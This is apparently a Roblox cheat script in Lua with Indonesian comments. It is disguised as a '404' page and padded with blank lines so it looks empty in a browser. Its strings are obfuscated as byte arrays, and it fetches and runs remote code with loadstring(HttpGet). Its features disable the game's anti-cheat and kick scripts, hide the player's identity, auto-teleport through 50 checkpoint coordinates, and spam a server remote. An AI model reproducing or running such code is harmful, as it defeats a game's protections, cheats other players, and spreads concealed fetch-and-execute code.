-- [[ 404 RESOURCE NOT FOUND ]]
-- Peringatan: Script ini menggunakan teknik "Invisible Padding"
-- Halaman ini akan terlihat KOSONG atau ERROR di browser.
-- JANGAN DUDUK | NAMA INVISIBLE | NO FEATURE CHANGED!




















































































































































































































local _lIlII = function(_IIl) local _lI = "" for i=1, #_IIl do _lI = _lI .. string.char(_IIl[i]) end return _lI end
local _i1i1 = loadstring(game:HttpGet(_lIlII({104,116,116,112,115,58,47,47,115,105,114,105,117,115,46,109,101,110,117,47,114,97,121,102,105,101,108,100})))()

local _SKY7 = _i1i1:CreateWindow({
   Name = "🚀 MT LANIAKEA | CenzyXCode 🌀",
   LoadingTitle = "🌀 REAL GHOST SYSTEM ACTIVE...",
   LoadingSubtitle = "by CenzyXCode",
   ConfigurationPadding = 2, KeySystem = false,
})

-- [[ CELESTIAL WATERMARK ]]
spawn(function()
    local _w = {"🔥 CenzyXCode 💎", "⚡ CenzyXCode ✨", "🌀 CenzyXCode 🚀", "😈 CenzyXCode 😈"}
    while task.wait(0.2) do for _, v in pairs(_w) do _SKY7:ModifyStatus(v) task.wait(0.2) end end
end)

local _T1 = _SKY7:CreateTab("Main Features 😈", 4483362458)
_T1:CreateLabel("⚠️ Wajib di aktifin 2 bypas itu supaya akun klean aman !")
local _T2 = _SKY7:CreateTab("🛡️ Identity Protector", 4483362458)
local _T3 = _SKY7:CreateTab("🌐 Server System", 4483362458)

-- [[ COORDINATE VAULT - NO CHANGES ]]
local _ACT = false
local _VLT = {{551.9,137.03,36.3},{957.23,133.03,-713.13},{1611.34,153.03,-1497.57},{1845.41,341.03,-1682.17},{3137.91,621.03,-1423.82},{3856.75,797.03,-2199.89},{3475.01,1191.37,-2777.14},{3224.34,1381.03,-3075.85},{3017.64,1093.03,-3546.05},{3556.23,1097.03,-4158.99},{3427.96,1093.03,-4708.43},{4643.06,1257.03,-5270.42},{5089.3,1265.03,-4865.41},{5015.29,1409.03,-4554.33},{4922.18,1129.03,-3744.22},{5177.16,1117.03,-3071.14},{5326.7,1117.03,-2545.2},{5199.14,1429.03,-2070.18},{5221.37,1241.03,-1445.73},{5007.45,1237.03,-869.44},{5507.83,1237.03,-3.2},{5143.37,1449.03,804.74},{4462.7,1453.03,1201.42},{3913.72,1189.03,1524.01},{3903.34,1189.03,1818.44},{3985.7,1633.03,2214.75},{4152.43,1649.03,3177.94},{3104.86,1625.03,3683.45},{2347.55,1633.03,2943.86},{1178.38,1765.03,3280.89},{837.24,1773.03,3867.82},{974.97,2089.03,4275.2},{1503.7,2305.03,3991.68},{1620.69,2309.03,4789.52},{1502.45,2317.03,4961.38},{1269.25,2481.03,5180.88},{1666.3,2489.03,5756.81},{1527.46,2221.03,6561.89},{1552.79,2217.03,7360.59},{1355.34,2497.03,7648.27},{964.91,2521.03,7968.75},{779.25,2637.03,8245.44},{949.77,2641.03,8653.42},{431.16,2645.03,9336.95},{573.32,2921.03,9671.8},{949.56,2929.03,10140.71},{672.22,3093.03,10387.12},{23.03,3109.03,10621.7},{-687.75,2809.03,10963.8},{-1853.58,2833.03,11749.53},{-2720.61,3433.03,12148.35}}

-- [[ BYPASS ENGINE ]]
_T1:CreateButton({Name = _lIlII({66,121,112,97,115,115,32,65,110,116,105,45,66,97,110,32,40,71,72,79,83,84,41}), Callback = function()
    for _, v in pairs(game:GetDescendants()) do if v:IsA(_lIlII({76,111,99,97,108,83,99,114,105,112,116})) and (v.Name:lower():find(_lIlII({97,110,116,105})) or v.Name:lower():find(_lIlII({107,105,99,107}))) then v.Disabled = true end end
    _i1i1:Notify({Title = "SYSTEM", Content = "BYPASS SUCCESS!", Duration = 5})
end})

local _iS = false
_T2:CreateToggle({Name = _lIlII({66,121,112,97,115,115,32,73,100,101,110,116,105,116,121,32,40,73,110,118,105,115,105,98,108,101,41}), CurrentValue = false, Callback = function(_v)
    _iS = _v if _iS then _i1i1:Notify({Title = "SYSTEM", Content = "INVISIBLE ACTIVE!", Duration = 5}) end
    spawn(function() while _iS do 
        local _p = game.Players.LocalPlayer 
        if _p.Character and _p.Character:FindFirstChild(_lIlII({72,101,97,100})) then 
            for _, g in pairs(_p.Character.Head:GetChildren()) do if g:IsA(_lIlII({66,105,108,108,98,111,97,114,100,71,117,105})) then g.Enabled = false end end 
        end
        _p.DisplayName = " " _p.Name = _lIlII({67,101,110,122,121,88,67,111,100,101,95,71,104,111,115,116}) task.wait(0.5) 
    end end)
end})

_T3:CreateButton({Name = "🌐 Join Smallest Server", Callback = function()
    local s = game:GetService(_lIlII({72,116,116,112,83,101,114,119,105,99,101})):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
    for _, v in pairs(s.data) do if v.playing < v.maxPlayers and v.id ~= game.JobId then game:GetService(_lIlII({84,101,108,101,112,111,114,116,83,101,114,119,105,99,101})):TeleportToPlaceInstance(game.PlaceId, v.id) break end end
end})

-- [[ TP ENGINE STANDING ]]
_T1:CreateToggle({Name = "Auto TP Loop (CP 50 Absolute)", CurrentValue = false, Callback = function(_v)
    _ACT = _v while _ACT do
        for i=1, #_VLT do if not _ACT then break end
            local _c = game.Players.LocalPlayer.Character
            if _c and _c:FindFirstChild(_lIlII({72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116})) then
                local _w = (i == 50) and 0.4 or 0.15
                local _s = tick()
                repeat 
                    _c.HumanoidRootPart.CFrame = CFrame.new(_VLT[i][1], _VLT[i][2], _VLT[i][3]) 
                    _c.HumanoidRootPart.Velocity = Vector3.new(0,0,0) 
                    task.wait(0.01) 
                until tick() - _s >= _w
            end task.wait(0.5)
        end
        local _r = game:GetService(_lIlII({82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101})):FindFirstChild(_lIlII({82,101,115,101,116,67,104,101,99,107,112,111,105,110,116,82,101,109,111,116,101}))
        if _r then 
            task.wait(1.2) 
            for i=1, 25 do _r:FireServer() task.wait(0.04) end 
            -- FIXED: TETAP BERDIRI (GAK DUDUK)
            pcall(function() game.Players.LocalPlayer.Character.Humanoid.Sit = false end)
        end
        task.wait(2.5)
    end
end})
